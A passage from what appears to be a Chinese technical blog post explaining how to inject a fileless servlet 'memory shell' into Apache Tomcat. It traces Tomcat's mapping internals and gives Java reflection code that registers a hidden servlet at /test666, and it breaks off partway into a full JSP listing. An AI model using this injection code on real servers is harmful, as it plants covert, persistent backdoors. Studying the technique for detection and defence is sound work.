<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231161805758.png" alt="image-20201231161805758"></p>
<p>​        向上跟踪调用org.apache.catalina.core.StandardWrapperValve#invoke,invoke方法中，将wrapper.allocate()的结果赋值给servlet。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231162057960.png" alt="image-20201231162057960"></p>
<p>​        跟入wrapper.allocate()，这里instance已经是DefaultServlet了，因此不会再去创建实例。所以需要继续向上追踪，查看哪里给wrapper.instance赋值的。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231163240379.png" alt="image-20201231163240379"></p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231163419357.png" alt="image-20201231163419357"></p>
<p>​        看看wrapper是怎么得到的，通过getContainer()获取当前对象ValveBase的container得到的。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231164001104.png" alt="image-20201231164001104"></p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231164027686.png" alt="image-20201231164027686"></p>
<p>​            查看上层org.apache.catalina.core.StandardContextValve#invoke调用,container的内容在wrapper中已经赋值好了。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231165925365.png" alt="image-20201231165925365"></p>
<p>​        而wrapper的内容是通过request获得的，因此要继续向上追踪request是如何获得的。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231170148864.png" alt="image-20201231170148864"></p>
<p>​        向上跟踪到org.apache.catalina.connector.CoyoteAdapter#service方法中，在service方法中，创建了request对象，经过postParseRequest方法处理后，给servletClass赋值。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231170927517.png" alt="image-20201231170927517"></p>
<p>​        在postParseRequest方法中，经过<code>connector.getService().getMapper().map(serverName, decodedURI,version, request.getMappingData());</code>处理后servletClass会被赋值。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231171846938.png" alt="image-20201231171846938"></p>
<p>​        跟进map方法并向下跟踪调用，在org.apache.catalina.mapper.Mapper#find(org.apache.catalina.mapper.Mapper.MapElement<T>[], org.apache.tomcat.util.buf.CharChunk, int, int)中会去比对访问的路径和定义的servlet路径是否相同。这里的map对象中只有我们定义的servlet的路径，并没有动态添加的servlet路径。</T></p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231172858261.png" alt="image-20201231172858261"></p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231172956381.png" alt="image-20201231172956381"></p>
<p>​        看到上面其实我们已经知道为什么我们动态添加的servlet没有加载了，再看看find方法的上层调用org.apache.catalina.mapper.Mapper#internalMapExactWrapper,由于没有匹配到结果，因此wrapper返回为空，不满足if条件会被直接返回。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231173956853.png" alt="image-20201231173956853"></p>
<p>​        也就是说<code>contextVersion.exactWrappers</code>匹配失败，<code>contextVersion.exactWrappers</code>中保存的是自定义的servlet的mapper。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231174828367.png" alt="image-20201231174828367"></p>
<p>​        exactWrappers匹配失败后会去判断<code>contextVersion.extensionWrappers</code>是否匹配。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231175039952.png" alt="image-20201231175039952"></p>
<p>​        其他的类似，最后处理default servlet设置<code>mappingData.wrapper</code>的值为defaultWrapper，因此访问/test666最终会执行defaultServlet。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231175138329.png" alt="image-20201231175138329"></p>
<h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><p>​        通过上面的分析，我们只要在contextVersion中添加Mapper即可动态加载内存马。首先看一下<code>contextVersion.exactWrappers</code>是在何时赋值的，经过分析调用，在org.apache.catalina.mapper.Mapper#addWrapper(org.apache.catalina.mapper.Mapper.ContextVersion, java.lang.String, org.apache.catalina.Wrapper, boolean, boolean)中，会根据url的内容不同，给mapper的不同wrappers属性赋值，当所有的都不匹配是，才会给exactWrappers赋值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addWrapper</span><span class="params">(ContextVersion context, String path,</span></span></span><br><span class="line"><span class="function"><span class="params">           Wrapper wrapper, <span class="keyword">boolean</span> jspWildCard, <span class="keyword">boolean</span> resourceOnly)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">synchronized</span> (context) &#123;</span><br><span class="line">           <span class="keyword">if</span> (path.endsWith(<span class="string">"/*"</span>)) &#123;</span><br><span class="line">               <span class="comment">// Wildcard wrapper</span></span><br><span class="line">               String name = path.substring(<span class="number">0</span>, path.length() - <span class="number">2</span>);</span><br><span class="line">               MappedWrapper newWrapper = <span class="keyword">new</span> MappedWrapper(name, wrapper,</span><br><span class="line">                       jspWildCard, resourceOnly);</span><br><span class="line">               MappedWrapper[] oldWrappers = context.wildcardWrappers;</span><br><span class="line">               MappedWrapper[] newWrappers = <span class="keyword">new</span> MappedWrapper[oldWrappers.length + <span class="number">1</span>];</span><br><span class="line">               <span class="keyword">if</span> (insertMap(oldWrappers, newWrappers, newWrapper)) &#123;</span><br><span class="line">                   context.wildcardWrappers = newWrappers;</span><br><span class="line">                   <span class="keyword">int</span> slashCount = slashCount(newWrapper.name);</span><br><span class="line">                   <span class="keyword">if</span> (slashCount &gt; context.nesting) &#123;</span><br><span class="line">                       context.nesting = slashCount;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (path.startsWith(<span class="string">"*."</span>)) &#123;</span><br><span class="line">               <span class="comment">// Extension wrapper</span></span><br><span class="line">               String name = path.substring(<span class="number">2</span>);</span><br><span class="line">               MappedWrapper newWrapper = <span class="keyword">new</span> MappedWrapper(name, wrapper,</span><br><span class="line">                       jspWildCard, resourceOnly);</span><br><span class="line">               MappedWrapper[] oldWrappers = context.extensionWrappers;</span><br><span class="line">               MappedWrapper[] newWrappers =</span><br><span class="line">                   <span class="keyword">new</span> MappedWrapper[oldWrappers.length + <span class="number">1</span>];</span><br><span class="line">               <span class="keyword">if</span> (insertMap(oldWrappers, newWrappers, newWrapper)) &#123;</span><br><span class="line">                   context.extensionWrappers = newWrappers; <span class="comment">//extensionWrappers赋值</span></span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (path.equals(<span class="string">"/"</span>)) &#123;</span><br><span class="line">               <span class="comment">// Default wrapper</span></span><br><span class="line">               MappedWrapper newWrapper = <span class="keyword">new</span> MappedWrapper(<span class="string">""</span>, wrapper,</span><br><span class="line">                       jspWildCard, resourceOnly);</span><br><span class="line">               context.defaultWrapper = newWrapper; <span class="comment">//defaultWrapper赋值</span></span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="comment">// Exact wrapper</span></span><br><span class="line">               <span class="keyword">final</span> String name;</span><br><span class="line">               <span class="keyword">if</span> (path.length() == <span class="number">0</span>) &#123;</span><br><span class="line">                   <span class="comment">// Special case for the Context Root mapping which is</span></span><br><span class="line">                   <span class="comment">// treated as an exact match</span></span><br><span class="line">                   name = <span class="string">"/"</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   name = path;</span><br><span class="line">               &#125;</span><br><span class="line">               MappedWrapper newWrapper = <span class="keyword">new</span> MappedWrapper(name, wrapper,</span><br><span class="line">                       jspWildCard, resourceOnly);</span><br><span class="line">               MappedWrapper[] oldWrappers = context.exactWrappers;</span><br><span class="line">               MappedWrapper[] newWrappers = <span class="keyword">new</span> MappedWrapper[oldWrappers.length + <span class="number">1</span>];</span><br><span class="line">               <span class="keyword">if</span> (insertMap(oldWrappers, newWrappers, newWrapper)) &#123;</span><br><span class="line">                   context.exactWrappers = newWrappers;  <span class="comment">//exactWrappers赋值</span></span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104110344314.png" alt="image-20210104110344314"></p>
<p>​        我们要调用addWrapper来设置wrapper的属性，首先得解决几个问题：</p>
<h4 id="问题一：如何获取-ContextVersion对象？"><a href="#问题一：如何获取-ContextVersion对象？" class="headerlink" title="问题一：如何获取 ContextVersion对象？"></a><strong>问题一：如何获取 ContextVersion对象？</strong></h4><p>​        查看addWrapper的调用链，addWrapper是由org.apache.catalina.mapper.Mapper#addWrappers(org.apache.catalina.mapper.Mapper.ContextVersion, java.util.Collection&lt;org.apache.catalina.mapper.WrapperMappingInfo&gt;)调用的，而addWrappers中已经传入了ContextVersion对象，所以需要继续向上追踪。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104112628640.png" alt="image-20210104112628640"></p>
<p>​        在org.apache.catalina.mapper.Mapper#addContextVersion中，创建了ContextVersion对象，但是创建直接创建这个对象需要resources这个属性，而这个属性是StandardRoot对象，在运行过程中无法通过standardContext来获取，所以不考虑通过new的方式创建ContextVersion对象，但是经过分析ContextVersion对象会被保存到mapper的contextObjectToContextVersionMap，因此可以通过获取mapper-》contextObjectToContextVersionMap-》ContextVersion来获取ContextVersion对象。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104144102396.png" alt="image-20210104144102396"></p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104144140687.png" alt="image-20210104144140687"></p>
<p>​        可以将获取ContextVersion是的问题转换为获取Mapper对象的问题。继续向上跟踪org.apache.catalina.mapper.MapperListener#registerContext中，通过mapper对象来调用的addContextVersion。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104113652212.png" alt="image-20210104113652212"></p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104113753731.png" alt="image-20210104113753731"></p>
<p>​        经过调试发现，mapper对象可以通过StandardService来获取，而applicationContext中可以获取service对象，因此获取ContextVersion的问题可以解决。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104113819306.png" alt="image-20210104113819306"></p>
<h4 id="问题二：如何创建一个Wrapper对象？"><a href="#问题二：如何创建一个Wrapper对象？" class="headerlink" title="问题二：如何创建一个Wrapper对象？"></a>问题二：如何创建一个Wrapper对象？</h4><p>​        在addWrapper中的wrapper是一个StandardWrapper对象，所以要分析如何获取StandardWrapper对象。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104115103558.png" alt="image-20210104115103558"></p>
<p>​        在StandardWrapper的构造方法打断点，可以看到在org.apache.catalina.core.StandardContext#createWrapper中，可以获取StandardWrapper对象。StandardContext是可以动态获取的，因此可以通过StandardContext.createWrapper方法获取到StandardWrapper对象。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104115418557.png" alt="image-20210104115418557"></p>
<p>​        但查看addWrapper方法中的wrapper对象，其使用的还是非常多的。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104120216543.png" alt="image-20210104120216543"></p>
<p>​        但是这点不用担心，因为通过<code>new StandardWrapper()</code>创建wrapper就会设置很多属性，只要对instance、servletclass、mappings等和servlet有关的属性设置就可以了。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104134133813.png" alt="image-20210104134133813"></p>
<h2 id="servlet内存马实现"><a href="#servlet内存马实现" class="headerlink" title="servlet内存马实现"></a>servlet内存马实现</h2><p>​        在本部分的内容不讲如何获取standardContext、applicationContext等对象了，之前在Filter内存马的时候分析过了。假设已经获取了standardContext、applicationContext对象，下面获取其他对象。</p>
<h3 id="获取ContextVersion"><a href="#获取ContextVersion" class="headerlink" title="获取ContextVersion"></a>获取ContextVersion</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Field serviceF = applicationContext.getClass().getDeclaredField(<span class="string">"service"</span>); <span class="comment">//通过applicationContext获取service对象</span></span><br><span class="line">serviceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardService service = (StandardService) serviceF.get(applicationContext);</span><br><span class="line">Mapper mapper = service.getMapper(); <span class="comment">//获取mapper</span></span><br><span class="line">Field contextObjectToContextVersionMapF = mapper.getClass().getDeclaredField(<span class="string">"contextObjectToContextVersionMap"</span>); </span><br><span class="line">contextObjectToContextVersionMapF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ConcurrentHashMap contextObjectToContextVersionMap = (ConcurrentHashMap ) contextObjectToContextVersionMapF.get(mapper); <span class="comment">//获取contextObjectToContextVersionMap属性</span></span><br><span class="line">Object contextVersion = contextObjectToContextVersionMap.get(standardContext); <span class="comment">//获取contextVersion对象</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104144759287.png" alt="image-20210104144759287"></p>
<h3 id="创建Wrapper对象并赋值"><a href="#创建Wrapper对象并赋值" class="headerlink" title="创建Wrapper对象并赋值"></a>创建Wrapper对象并赋值</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">StandardWrapper wrappershell = (StandardWrapper) standardContext.createWrapper(); <span class="comment">//获取StandardWrapper对象</span></span><br><span class="line">TomcatServlet tomcatServlet=<span class="keyword">new</span> TomcatServlet(); <span class="comment">//创建servlet对象</span></span><br><span class="line">Field instanceF = wrappershell.getClass().getDeclaredField(<span class="string">"instance"</span>); <span class="comment">//获取StandardWrapper打的instance属性</span></span><br><span class="line">instanceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">instanceF.set(wrappershell,tomcatServlet); <span class="comment">//为instance属性赋值</span></span><br><span class="line">wrappershell.setServletClass(Class.forName(<span class="string">"TomcatServlet"</span>).getName()); <span class="comment">//设置servletclass属性，可以通过setServletClass实现，因此不需要通过反射机制修改。</span></span><br></pre></td></tr></table></figure>

<p>​        通过上面的设置，可以得到StandardWrapper对象，并且设置其中的instance和servletClass属性，下面尝试通过<code>wrappershell.addMapping(&quot;/test666&quot;);</code>但是这么设置后由于没有给StandardWrapper设置parent属性所以会抛异常。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104141540768.png" alt="image-20210104141540768"></p>
<p>​        在addWrapper方法中，wrapper.parent是StandardContext对象，因此需要设置StandardWrapper.parent为StandardContext。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104141837343.png" alt="image-20210104141837343"></p>
<p>​        parent属性的定义在org.apache.catalina.core.ContainerBase中</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104142155491.png" alt="image-20210104142155491"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Field parent = ContainerBase.class.getDeclaredField("parent");</span><br><span class="line">parent.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">parent.set(wrappershell, standardContext);</span><br><span class="line">wrappershell.addMapping(<span class="string">"/test666"</span>);</span><br></pre></td></tr></table></figure>

<h3 id="addWrapper设置exactWrappers"><a href="#addWrapper设置exactWrappers" class="headerlink" title="addWrapper设置exactWrappers"></a>addWrapper设置exactWrappers</h3><p>​        下面通过反射调用addWrapper</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class[] classes = mapper.getClass().getDeclaredClasses();</span><br><span class="line">Class contextversionClass = classes[<span class="number">1</span>]; <span class="comment">//获取内部类contextversion的Class</span></span><br><span class="line">Method addWrapper = mapper.getClass().getDeclaredMethod(<span class="string">"addWrapper"</span>, contextversionClass, String<span class="class">.<span class="keyword">class</span>, <span class="title">Wrapper</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>)</span>;</span><br><span class="line">addWrapper.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">addWrapper.invoke(mapper, contextVersion, <span class="string">"/test666"</span>, wrappershell, <span class="keyword">false</span>, <span class="keyword">false</span>); <span class="comment">//反射调用addWrapper</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104150812155.png" alt="image-20210104150812155"></p>
<p>​        最终成功实现内存马的功能。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104150927298.png" alt="image-20210104150927298"></p>
<p>​        给出完整的JSP代码，如下所示：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.management.MBeanServer"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.tomcat.util.modeler.Registry"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.Map"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.HashMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Method"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.InvocationTargetException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardService"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.mapper.Mapper"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.util.concurrent.ConcurrentHashMap"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.Wrapper"</span> %&gt;</span><br><span 